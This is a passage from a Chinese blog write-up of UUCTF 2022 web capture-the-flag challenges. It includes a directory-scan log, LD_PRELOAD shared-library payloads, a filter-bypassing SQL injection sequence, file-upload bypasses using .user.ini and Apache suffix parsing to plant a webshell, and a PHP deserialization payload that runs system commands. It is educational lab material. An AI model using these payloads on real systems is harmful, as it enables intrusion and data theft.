class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span>                                     </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">16</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">12</span>KB <span class="operator">-</span> <span class="symbol">/.index.php.swp</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">338</span>B  <span class="operator">-</span> <span class="symbol">/upload</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">26479</span><span class="operator">/</span>upload<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">86</span>B  <span class="operator">-</span> <span class="operator">/</span>upload<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">277</span>B  <span class="operator">-</span> <span class="symbol">/upload/upload.php</span>   </span><br></pre></td></tr></table></figure></div>
+<p>上传的地点在&#x2F;upload&#x2F;upload.php</p>
+<p>有两种常见的利用代码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> </span>&#123;   <span class="comment">//需要搜索查看函数的原型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67b7443fd0e0a243d4011428.png"><br>但是这里对上传的文件类型有点限制,修改后缀名为jpg后上传<br>最后到主页访问上传之后的路径就得到flag</p>
+<h1 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h1><p><img src="https://pic1.imgdb.cn/item/67b846ccd0e0a243d4015de5.png"><br>提示看源码，但是这里f12和右键都被禁用了，可以在url修改，加上view-source:就可以了</p>
+<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p><img src="https://pic1.imgdb.cn/item/67b86675d0e0a243d401672a.png"><br>通过这里的回显可以看到是什么过滤了<br>通过输入几个常见的字符，发现<code>or from ro </code>被过滤，而且输入的内容会倒序输出<br>这里过滤了这些关键字，但是其实是替换成空格，用双写绕过就可以,然后可以自己写一个python脚本反转就可以</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for <span class="selector-tag">i</span> in range(<span class="number">100</span>):</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入字符&quot;</span>);</span><br><span class="line">    print (s<span class="selector-attr">[::-1]</span>)</span><br></pre></td></tr></table></figure></div>
+<p>双写绕过示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入字符<span class="keyword">from</span></span><br><span class="line">morf</span><br><span class="line"></span><br><span class="line">payload:mofromrf</span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;from&#x27;</span>) <span class="keyword">AND</span> username=(<span class="string">&#x27;&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure></div>
+<p>我们先倒序输入想要执行的被过滤的命令，然后在中间插入被过滤的指令，这样子中间的会被过滤，最后就能拼接出指令<br>后面就用正常的sql思路了 (中间自行用双写绕过)</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>爆库</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,database()# </span></span><br><span class="line"><span class="string">#)(esabatad,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:UUCTF</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>爆表</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span></span><br><span class="line"><span class="string">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni morf )eman_elbat(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:flag,users</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>爆字段</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">#&#x27;</span>galf<span class="string">&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni morf )eman_nmuloc(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag&#x27;</span>#<span class="string">&#x27;) AND username=(&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">Your Login name:1</span></span><br><span class="line"><span class="string">Your Password:UUCTF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.爆值</span></span><br><span class="line"><span class="string">输入字符1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="string">&#x27;UUCTF&#x27;</span>) <span class="keyword">from</span> UUCTF.flag#</span><br><span class="line"><span class="meta">#galf.FTCUU morf )FTCUU(tacnoc_puorg,1 tceles noinu )&#x27;1</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b88fa6d0e0a243d40171b2.png"><br>先随便上传一个普通的一句话木马看看有什么限制<br><img src="https://pic1.imgdb.cn/item/67b89015d0e0a243d40171be.png"><br>先是怀疑只是在前端做校验，然后用bp修改后缀试试。但是还是这个<br>然后用插件检测一下服务器，发现是apache，那就用.htaccess文件，这个文件是apache服务的一个解析配置文件<br>我们让这个目录下的.jpg文件都解析成php文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;/.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>但是上传这个文件发现也被过滤，还有一个和这个功能类似的配置文件叫做.user.ini,可以上传</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>
+<p>这个配置文件的意思是每个php文件在执行之前都会包含1.jpg这个文件，并且当作php执行，但是这里没有什么可以执行的php文件<br>看其他大佬的wp学习到了原来是要用apache解析漏洞<br>Apache 解析漏洞主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）<br>所以我们可以修改一个不合法的后缀，比如这个文件名改成<code>2.php.aaa</code>这样子解析的时候就会解析成php文件<br>但是还要注意用bp修改一下MIME 修改成jpg格式绕过MIME检测<br><img src="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png"><br>发现成功上传    文件存储在: upload&#x2F;2.php.aaa.php<br>然后可以用蚁剑连接找到flag了</p>
+<h1 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h1><p>题目</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">你输入的不正确！！！搞什么！！</span><br></pre></td></tr></table></figure></div>
+<p>最终我们想执行<code>eval($this-&gt;a);</code>我们就让<code>$this -&gt; a</code>成为我们想要执行的命令<br>但是这里的wakeup会把a重新赋值，之前绕过wakeup的方法是修改序列化中的变量个数，但是这里多了限制，不让修改<br>这里利用的是<code>$this-&gt;b=$this-&gt;c</code>，php中如果两个变量同时指向一个地址也可以绕过wakeup，和SWPUCTF2022新生赛Power中的绕过方法一样<br>原理就是我们让b指向a的地址，b值修改的时候，因为公用一片内存就回让a的值也变了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$x</span> -&gt; b = &amp;<span class="variable">$x</span> -&gt; a;</span><br><span class="line"><span class="variable">$x</span> -&gt; c = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>然后get传入这个序列化字符串就行</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/18581.html" title="UUCTF_2022新生赛(web)WP">https://guayu-kakeru.github.io/posts/18581.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/48411.html" rel="prev" title="HMV-Five">
+      <i class="fa fa-chevron-left"></i> HMV-Five
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/41749.html" rel="next" title="HMV-Talk">
+      HMV-Talk <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ezpop"><span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#funmd5"><span class="nav-text">funmd5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezrce"><span class="nav-text">ezrce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phonecode"><span class="nav-text">phonecode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#uploadandinject"><span class="nav-text">uploadandinject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#websign"><span class="nav-text">websign</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezsql"><span class="nav-text">ezsql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-upload"><span class="nav-text">ez_upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-unser"><span class="nav-text">ez_unser</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/41749.html" title="posts&#x2F;41749.html">HMV-Talk</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/18581.html" title="posts&#x2F;18581.html">UUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
